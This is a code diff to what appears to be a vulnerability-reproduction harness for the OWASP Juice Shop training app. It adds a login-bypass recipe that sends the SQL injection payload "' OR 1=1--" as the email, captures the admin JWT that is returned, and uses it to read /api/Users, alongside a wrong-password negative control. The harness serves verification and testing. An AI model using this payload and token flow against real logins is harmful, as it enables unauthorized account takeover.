@@ -1,5 +1,6 @@
 import type {
   GetRecipesForTargetFn,
+  ReproductionProbeResult,
   ReproductionRecipe,
   ReproductionRequest,
 } from "@/lib/reproduction/types";
@@ -130,8 +131,115 @@ function sqliSearchRecipe(config: JuiceShopConfig): ReproductionRecipe {
   };
 }
 
+/** Frozen in decisions.md Q18: `POST /rest/user/login` for the exploit and its negative
+ * control, `GET /api/Users` for the follow-up that proves the minted token grants access. Not
+ * config, unlike `searchPath`: Juice Shop's own routing fixes both, so nothing about them varies
+ * across a rebuild of the same pinned target. */
+const LOGIN_PATH = "/rest/user/login";
+const USERS_PATH = "/api/Users";
+
+/**
+ * Frozen in decisions.md Q18: a classic always-true WHERE clause, closing out the query with a
+ * comment so nothing after it (the password check) still applies. It matches the first row in
+ * the Users table -- id 1, the seeded admin account -- regardless of what password is sent.
+ */
+const LOGIN_BYPASS_EMAIL = "' OR 1=1--";
+
+/**
+ * routes/login.ts replies with `{ authentication: { token, bid, umail } }` on a successful
+ * login (the JWT security.authorize(user) mints) and something else entirely -- no
+ * `authentication` object -- on a 401. Returns undefined for anything that isn't a well-formed
+ * token, which is exactly the signal both call sites below need: "was there a token to chase at
+ * all."
+ */
+function extractAuthToken(response: ReproductionProbeResult): string | undefined {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(response.body);
+  } catch {
+    return undefined;
+  }
+  if (typeof parsed !== "object" || parsed === null) return undefined;
+  const authentication = (parsed as Record<string, unknown>).authentication;
+  if (typeof authentication !== "object" || authentication === null) return undefined;
+  const token = (authentication as Record<string, unknown>).token;
+  return typeof token === "string" && token.length > 0 ? token : undefined;
+}
+
+/**
+ * Builds the exploit's follow-up: the minted token, presented the way Juice Shop's own
+ * `express-jwt`-backed `security.isAuthorized()` middleware expects it -- `utils.jwtFrom(req)`
+ * reads a standard `Authorization: Bearer <token>` header (lib/insecurity.ts). Returns undefined
+ * when the exploit response minted nothing, e.g. the injection didn't work this run: that is a
+ * complete exploit leg with no proof, not a request worth sending.
+ */
+function buildUsersFollowUpRequest(exploitResponse: ReproductionProbeResult): ReproductionRequest | undefined {
+  const token = extractAuthToken(exploitResponse);
+  if (!token) return undefined;
+  return {
+    method: "GET",
+    path: USERS_PATH,
+    headers: { Authorization: `Bearer ${token}` },
+  };
+}
+
+/**
+ * `GET /api/Users` is the finale-backed admin listing (server.ts's `autoModels`, User excluding
+ * only `password` and `totpSecret`), wrapped by the same `{ status, data: [...] }` shape as
+ * every other finale route. Unlike the search recipe's UNION result -- where the query's own
+ * column order remaps the injected email to a field literally called "name" -- this listing
+ * returns the real `email` column verbatim, so the canary lands under its own name here.
+ */
+function canaryInUsersResponse(body: string, canary: string): boolean {
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(body);
+  } catch {
+    return false;
+  }
+  if (typeof parsed !== "object" || parsed === null) return false;
+  const rows = (parsed as { data?: unknown }).data;
+  if (!Array.isArray(rows)) return false;
+  return rows.some((row) => {
+    if (typeof row !== "object" || row === null) return false;
+    const email = (row as Record<string, unknown>).email;
+    return typeof email === "string" && email.includes(canary);
+  });
+}
+
+function loginBypassRecipe(config: JuiceShopConfig): ReproductionRecipe {
+  return {
+    id: "juice-shop-login-bypass",
+    title: "Authentication bypass via SQL injection in login",
+    keywords: ["sql injection", "sqli", "auth bypass", "authentication bypass", "login bypass", LOGIN_PATH],
+    fixture: registrationFixture(config),
+    // The negative control is the same login with the canary's own email but a wrong password,
+    // which Juice Shop correctly rejects with 401 -- a legitimate, complete answer, not an
+    // infrastructure failure, hence negativeControlAcceptedStatuses below.
+    negativeControl: {
+      method: "POST",
+      path: LOGIN_PATH,
+      body: { email: CANARY_PLACEHOLDER, password: "definitely-the-wrong-password" },
+    },
+    negativeControlAcceptedStatuses: [401],
+    exploit: {
+      method: "POST",
+      path: LOGIN_PATH,
+      body: { email: LOGIN_BYPASS_EMAIL, password: "x" },
+    },
+    // Used for the negative control (expect no token from a rejected login). The exploit leg is
+    // decided by exploitFollowUp below instead: a minted token alone proves nothing, since any
+    // successful login -- injected or not -- would mint one.
+    oracleCheck: (response) => extractAuthToken(response) !== undefined,
+    exploitFollowUp: {
+      buildRequest: buildUsersFollowUpRequest,
+      oracleCheck: (response, canary) => canaryInUsersResponse(response.body, canary),
+    },
+  };
+}
+
 export const getRecipesForTarget: GetRecipesForTargetFn = (target) => {
   if (target.name !== "juice-shop-v17.3.0") return [];
   if (!isJuiceShopConfig(target.config)) return [];
-  return [sqliSearchRecipe(target.config)];
+  return [sqliSearchRecipe(target.config), loginBypassRecipe(target.config)];
 };
